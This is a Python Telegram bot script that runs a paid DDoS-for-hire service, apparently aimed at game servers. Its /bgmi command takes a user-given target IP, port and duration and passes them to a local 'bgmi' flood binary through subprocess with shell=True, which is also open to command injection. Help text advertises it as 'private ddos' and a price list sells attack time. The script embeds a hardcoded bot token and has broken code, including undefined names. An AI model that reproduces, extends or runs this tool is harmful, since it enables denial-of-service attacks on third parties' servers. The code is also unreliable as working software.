#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import time
from keepalive import keep_alive
from threading import Timer

bgmi_path = 'bgmi'

# Grant execute permission to the file

try:

    os.chmod(bgmi_path, 0o755)  # 755 grants execute permissions for all users

    print(f"Execute permission granted for {bgmi_path}.")

except Exception as e:

    print(f"Failed to set execute permission: {e}")

# Keep-Alive Function
def keep_alive():
    print("Keeping Codespace alive by performing periodic activity...")
    try:
        response = requests.get("https://www.google.com")
        if response.status_code == 200:
            print("Ping successful. Codespace is still active.")
        else:
            print(f"Ping failed with status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred during ping: {e}")

# Keep-Alive Thread
def start_keep_alive_thread():
    while True:
        keep_alive()
        time.sleep(300)  # Sleep for 5 minutes (300 seconds) before the next ping

# Start keep-alive in a separate thread
#Thread(target=start_keep_alive_thread, daemon=True).start()

# insert your Telegram bot token here
bot = telebot.TeleBot('7385947182:AAGTYCXnhpXDRa2MDn5dKAx5BZzKz62H1-c')

# Admin user IDs
admin_id = ["5344691638"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "ʟᴏɢ ᴄʟᴇᴀʀᴇᴅ ᴀʟʀᴇᴀᴅʏ☑️."
            else:
                file.truncate(0)
                response = "ᴄʟᴇᴀʀᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ☑️ "
    except FileNotFoundError:
        response = "ɴᴏ ʟᴏɢs❎."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"ᴜsᴇʀ {user_to_add} ᴀᴅᴅᴇss sᴜᴄᴄᴇssғᴜʟʟʏ ☑️."
            else:
                response = "ᴜsᴇʀ ᴀʟʀᴇᴀᴅʏ ɪɴ ʙᴏᴛ✔️."
        else:
            response = "ᴇɴᴛᴇʀ ɴᴇᴡ ᴜsᴇʀ ɪᴅ🗿."
    else:
        response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ ❗."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"ᴜsᴇʀ {user_to_remove} ʀᴇᴍᴏᴠᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ☑️."
            else:
                response = f"ᴜsᴇʀ {user_to_remove} ɴᴏᴛ ғᴏᴜɴᴅ ɪɴ ʟɪsᴛ🔴."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ❗."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "ᴄʟᴇᴀʀᴇᴅ ᴀʟʀᴇᴀᴅʏ❗."
                else:
                    file.truncate(0)
                    response = "sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʟᴇᴀʀᴇᴅ☑️ "
        except FileNotFoundError:
            response = "ʟᴏɢ ᴄʟᴇᴀʀᴇᴅ ᴀʟʀᴇᴀᴅʏ☑️."
    else:
        response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ❗."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀ:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- ᴜsᴇʀ ɪᴅ: {user_id}\n"
                else:
                    response = "ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ"
        except FileNotFoundError:
            response = "ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ"
    else:
        response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ."
                bot.reply_to(message, response)
        else:
            response = "ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ"
            bot.reply_to(message, response)
    else:
        response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ❗."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"ʏᴏᴜʀ ɪᴅ: {user_id}"
    bot.reply_to(message, response)

import datetime
import subprocess

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f" 🚀𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧🥶\n🎯𝐈𝐏:{target} \n⛱️️𝙋𝙤𝙧𝙩:{port} \n⌚𝐓𝐢ᴍᴇ:{time}\n᚛ @Bgmi_owner_420 ᚜"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 10 #  seconds cooldown time

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "ᴄᴏᴏʟᴅᴏᴡɴ ᴏɴ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ¼ ᴍɪɴᴜᴛᴇ ᴀɴᴅ ᴜsᴇ ᴀɢᴀɪɴ /bgmi ᴄᴏᴍᴍᴀɴᴅ❗ "
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 240:
                response = "ᴇʀʀᴏʀ: ᴍᴀx ᴀᴛᴛᴀᴄᴋ sᴇᴄᴏɴᴅ 240sᴇᴄ ❌."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"🚀ᴀᴛᴛᴀᴄᴋ ᴏɴ➡️ {target}:{port} \n💘ᴄᴏᴍᴘʟᴇᴛᴇ ✅ sᴜᴄᴄᴇssғᴜʟʟʏ🔊️"
        else:
            response = "ᴜsᴀɢᴇ✅ :- /bgmi <target> <port> <time> "  # Updated command syntax


    else:
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ 🤬"


    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"ᴜsᴇʀ ɪᴅ: {user_id}" in log]
                if user_logs:
                    response = "ʏᴏᴜʀ ᴄᴏᴍᴍᴀɴᴅ:\n" + "".join(user_logs)
                else:
                    response = "ɴᴏ ʟᴏɢs."
        except FileNotFoundError:
            response = "ɴᴏ ʟᴏɢ ғᴏᴜɴᴅ."
    else:
        response = "ɴᴏ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅ🐒
 /bgmi : ғᴏʀ ᴅᴅᴏs 😈. 
 /rules : ʀᴇᴀᴅ ᴄᴀʀᴇғᴜʟʟʏ🦁.
 /mylogs : ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋ🐎.
 /plan : ʙᴜʏ ғʀᴏᴍ ᴀᴅᴍɪɴ ✓\nhttps://t.me/Bgmi_owner_420

 To See Admin Commands:
 /admincmd : ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ 😎.
 '''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"ᴍᴏsᴛ ᴡᴇʟᴄᴏᴍᴇ ɪɴ ᴘʀɪᴠᴀᴛᴇ ᴅᴅᴏs ᴜsᴇʀ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ➡️: /help \n\nhttps://t.me/Bgmi_owner_420"
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} ғᴏʟʟᴏᴡ ᴛʜɪs ʀᴜʟᴇs⚠️:

ᴏɴʟʏ ᴏɴᴇ ʀᴜʟᴇ ᴅᴏ ɴᴏᴛ sᴘᴀᴍ '''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ʙᴜʏ ғʀᴏᴍ @Bgmi_owner_420

Vip :
-> Attack Time : 180 sᴇᴄ
> After Attack Limit :  ᴏɴᴇ ᴍɪɴᴜᴛᴇ
-> Concurrents Attack : 60

ᴘʀɪᴄᴇ ʟɪsᴛ :-\n
ᴏɴᴇ ᴅᴀʏ :-100ʀs
ᴏɴᴇ ᴡᴇᴀᴋ :- 500
ᴏɴᴇ ᴍᴏɴᴛʜ :- 1500'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : ᴀᴅᴅ ɴᴇᴡ ᴜsᴇʀ.
/remove <userid> : ʀᴇᴍᴏᴠᴇ ᴜsᴇʀ
/allusers : ᴀᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀ ʟɪsᴛ.
/logs : ᴀʟʟ ᴜsᴇʀ ʟᴏɢs.
/broadcast : ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ .
/clearlogs : ᴄʟᴇᴀʀ ʟᴏɢ ғɪʟᴇ.
/setexpire : sᴇᴛ ᴜsᴇʀ ᴛɪᴍᴇ
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ {user_id}: {str(e)}")
            response = "sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅᴇᴅ ᴛᴏ ᴀʟʟ ᴜsᴇʀ☑️."
        else:
            response = "ᴡʀɪᴛᴇ ᴀ ᴍᴇssᴀɢᴇ🦧 ."
    else:
        response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ❗."

    bot.reply_to(message, response)

# Function to expire a user after a certain time
def expire_user(user_id):
    if user_id in allowed_user_ids:
        allowed_user_ids.remove(user_id)
        with open(USER_FILE, "w") as file:
            for user_id in allowed_user_ids:
                file.write(f"{user_id}\n")

@bot.message_handler(commands=['setexpire'])
def set_expire_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            expire_minutes = int(command[2])
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                Timer(expire_minutes * 60, expire_user, [user_to_add]).start()
                response = f"ᴜsᴇʀ {user_to_add} ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ {expire_minutes} ᴍɪɴᴜᴛᴇ."
            else:
                response = "ᴜsᴇʀ ᴀʟʀᴇᴀᴅʏ ᴇxɪᴛs."
        else:
            response = "ᴘʟᴇᴀsᴇ ᴜsᴇ ᴜsᴇʀ ɪᴅ ᴡɪᴛʜ ᴛɪᴍᴇ ɪɴ ᴍɪɴᴜᴛᴇ."
    else:
        response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ❗."
    bot.reply_to(message, response)

bot.polling()


def restart_bot():
    while True:
        try:
            # Get the current directory
            current_directory = os.path.dirname(os.path.abspath(__file__))
            # Replace 'your_bot_script.py' with the name of your bot script
            subprocess.run(['python3', os.path.join(current_directory, 'paid.py')], check=True)
        except subprocess.CalledProcessError as e:
            print(f'Bot crashed with error: {e}. Restarting...')
            time.sleep(5)  # Wait for 5 seconds before restarting

if __name__ == "__main__":
    
    keep_alive()
    
    # Create event loop
    loop = asyncio.new_event_loop()
    Thread(target=start_asyncio_thread).start()
    
    restart_bot()
    

#By @Bgmi_owner_420 ʙᴏss @Bgmi_owner_420
